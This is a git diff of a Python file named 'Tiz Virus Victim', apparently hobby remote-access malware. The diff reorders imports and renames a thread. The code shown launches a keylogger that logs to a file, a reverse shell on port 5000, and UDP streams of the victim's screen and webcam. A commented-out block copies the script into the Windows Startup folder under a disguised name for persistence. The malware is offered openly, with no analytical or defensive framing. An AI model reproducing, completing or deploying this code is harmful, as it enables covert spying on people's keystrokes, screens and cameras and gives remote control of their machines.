@@ -5,18 +5,19 @@ Created on Dec 23 2020
 @autor Tiz
 """
 
-from logging import info
-from pynput.keyboard import Key, Listener
-from shutil import copyfile
-import logging, threading, subprocess, socket, zlib, mss, argparse, sys, cv2, math, struct
+
+
+import threading, subprocess, socket, argparse, sys
 
 #copy the file in a place where it's gona be launched in every start # never tryed
-"""import os
+"""
+import os
+from shutil import copyfile
 username = os.getlogin()
 copyfile('virus.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/Windaube.py')
 """
 def parseargs():
-    cli_args = argparse.ArgumentParser(description="Tiz Virus")
+    cli_args = argparse.ArgumentParser(description="Tiz Virus Victim")
     cli_args.add_argument('--host',help="listening ip, default is '0.0.0.0', no need to change", default='0.0.0.0', type=str)
     cli_args.add_argument('--port',help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
     cli_args.add_argument('--keylog',help="keylog=t create a keylogger file / keylog=f don\'t create the file", default="t", type=str)
@@ -135,6 +136,9 @@ if __name__ == "__main__":
     options=parseargs()
     #keylogger
     if (options.keylog=="t"):
+        import logging
+        from pynput.keyboard import Key, Listener
+        from logging import info
         logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
         thread = threading.Thread(target=keylog)
         thread.start()
@@ -146,19 +150,20 @@ if __name__ == "__main__":
         threadshell = threading.Thread(target=R_tcp,args=(options.host,options.port)) #port 5000
         threadshell.start()
     #screen sender udp
+    import zlib, mss
     if (options.screen=="t"):
         WIDTH = 1900
         HEIGHT = 1000
         threadscreen = threading.Thread(target=screen_sender,args=(options.host,options.port+1)) # port 5001
         threadscreen.start()
     #camera sender udp
+    import cv2, math, struct
     if (options.camera=="t"):
         MAX_DGRAM = 2**16
         MAX_IMAGE_DGRAM = MAX_DGRAM - 64 # extract 64 bytes in case UDP frame overflown
-        threadshell = threading.Thread(target=camsender,args=(options.port+2,)) #port 5002
-        threadshell.start()
+        threadcam = threading.Thread(target=camsender,args=(options.port+2,)) #port 5002
+        threadcam.start()
     #suite
-    print("hacked !")
 
 
 
